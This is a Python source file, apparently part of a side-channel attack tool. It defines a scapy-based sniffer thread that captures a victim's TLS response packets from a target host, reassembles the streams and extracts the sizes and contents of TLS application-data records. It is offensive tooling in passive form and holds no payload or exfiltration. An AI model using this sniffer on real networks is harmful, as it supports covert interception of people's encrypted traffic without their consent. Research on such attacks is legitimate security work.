import threading
import logging
import binascii
import socket
import collections
from scapy.all import sniff, Raw

logger = logging.getLogger('sniffer')

# TLS Header
TLS_HEADER_LENGTH = 5
TLS_CONTENT_TYPE = 0
TLS_LENGTH_MAJOR = 3
TLS_LENGTH_MINOR = 4

# TLS Content Types
TLS_CHANGE_CIPHER_SPEC = 20
TLS_ALERT = 21
TLS_HANDSHAKE = 22
TLS_APPLICATION_DATA = 23
TLS_HEARTBEAT = 24
TLS_CONTENT = {
    TLS_CHANGE_CIPHER_SPEC: 'Change cipher spec (20)',
    TLS_ALERT: 'Alert (21)',
    TLS_HANDSHAKE: 'Handshake (22)',
    TLS_APPLICATION_DATA: 'Application Data (23)',
    TLS_HEARTBEAT: 'Heartbeat (24)'
}


class Sniffer(threading.Thread):
    '''
    Class that defines a sniffer thread object. It implements interface methods for
    creating, starting, reading the captured packets and deleting the sniffer.
    '''
    def __init__(self, arg):
        '''
        Initialize the sniffer thread object.

        Argument:
        arg -- dictionary with the sniffer parameters:
               interface: the device interface to use sniff on, e.g. wlan0
               source_ip: the local network IP of the victim, e.g. 192.168.1.66
               destination_host: the hostname of the attacked endpoint, e.g. dimkarakostas.com
        '''
        super(Sniffer, self).__init__()

        # Set thread to run as daemon
        self.daemon = True

        # Initialize object variables with parameters from arg dictionary
        self.arg = arg
        try:
            self.interface = str(arg['interface'])
            self.source_ip = str(arg['source_ip'])
            self.destination_host = str(arg['destination_host'])
            self.destination_port = int(arg['destination_port'])
        except KeyError:
            raise ValueError('Invalid argument dictionary - Not enough parameters')

        try:
            self.destination_ip = socket.gethostbyname(self.destination_host)
        except socket.gaierror, err:
            raise ValueError('socket.gaierror - {}'.format(str(err)))

        # If either of the parameters is None, raise ValueError
        if not all([
            self.interface,
            self.source_ip,
            self.destination_host,
            self.destination_port]
        ):
            raise ValueError('Invalid argument dictionary - Invalid parameters')

        # Dictionary with keys the destination (victim's) port
        # and value the data stream corresponding to that port
        self.port_streams = collections.defaultdict(lambda: [])

        self._recording = False

        self.record_lock = threading.Lock()

    def record_sniffing(self):
        logger.debug('Acquiring lock to start _recording')
        self.record_lock.acquire()

        logger.debug('Lock acquired, starting recording')
        self._recording = True

        logger.debug('Releasing lock from start _recording')
        self.record_lock.release()

    def run(self):
        # Capture only response packets
        capture_filter = 'tcp and src host {} and src port {} and dst host {}'.format(self.destination_ip, self.destination_port, self.source_ip)

        # Start blocking sniff function and parse captured packets
        sniff(
            iface=self.interface,
            filter=capture_filter,
            prn=lambda pkt: self.process_packet(pkt)
        )

    def process_packet(self, pkt):
        logger.debug('Acquiring lock to process packet')
        self.record_lock.acquire()

        logger.debug('Lock acquired, parsing packet')
        if self._recording:
            # Check for retransmission of same packet
            try:
                previous_packet = self.port_streams[pkt.dport][-1]
                if previous_packet[Raw] == pkt[Raw]:
                    return
            except IndexError:
                # Either stream list is empty
                # or one of the two packets does not have Raw data.
                # In either case, the packet is OK to be saved.
                pass

            self.port_streams[pkt.dport].append(pkt)

        logger.debug('Releasing lock from packet process')
        self.record_lock.release()

    def get_capture(self):
        # Get the data that were captured so far
        capture = self.parse_capture()

        return capture

    def stop(self):
        # Stop recording whatever you listen and erase your memory
        logger.debug('Acquiring lock to stop recording')
        self.record_lock.acquire()

        logger.debug('Lock acquired, stopping recording')
        self._recording = False
        self.port_streams = collections.defaultdict(lambda: [])

        logger.debug('Releasing lock from stop recording')
        self.record_lock.release()

    def is_recording(self):
        return self._recording

    def follow_stream(self, stream):
        stream_data = b''
        for pkt in stream:
            if Raw in pkt:
                stream_data += str(pkt[Raw])
        return stream_data

    def parse_capture(self):
        '''
        Parse the captured packets and return a string of the appropriate data.
        '''
        logger.debug('Parsing captured TLS streams')
        application_data = b''
        application_records = 0

        # Iterate over the captured packets
        # and aggregate the application level payload
        for port, stream in self.port_streams.items():
            stream_data = self.follow_stream(stream)

            data_record_list = self.get_application_data(stream_data)

            application_data += ''.join(data_record_list)
            application_records += len(data_record_list)

        logger.debug('Captured {} application data'.format(len(application_data)))
        logger.debug('Captured {} application records'.format(application_records))

        return {
            'data': application_data,
            'records': application_records
        }

    def get_application_data(self, payload_data):
        '''
        Parse aggregated packet data and keep only TLS application data.

        Argument:
            payload_data - binary string of TLS layer packet payload

        Returns a string of aggregated binary TLS application data,
        including record headers.
        '''
        application_data = []

        while payload_data:
            content_type = ord(payload_data[TLS_CONTENT_TYPE])
            length = 256 * ord(payload_data[TLS_LENGTH_MAJOR]) + ord(payload_data[TLS_LENGTH_MINOR])

            # payload_data should begin with a valid TLS header
            if content_type not in TLS_CONTENT:
                logger.warning('Invalid payload data.')

                # Flush invalid captured packets
                raise ValueError('Captured packets were not properly constructed')

            # Keep only TLS application data payload
            if content_type == TLS_APPLICATION_DATA:
                application_data.append(binascii.hexlify(payload_data[TLS_HEADER_LENGTH:TLS_HEADER_LENGTH + length]))

            # Parse all TLS records in the aggregated payload data
            payload_data = payload_data[TLS_HEADER_LENGTH + length:]

        return application_data
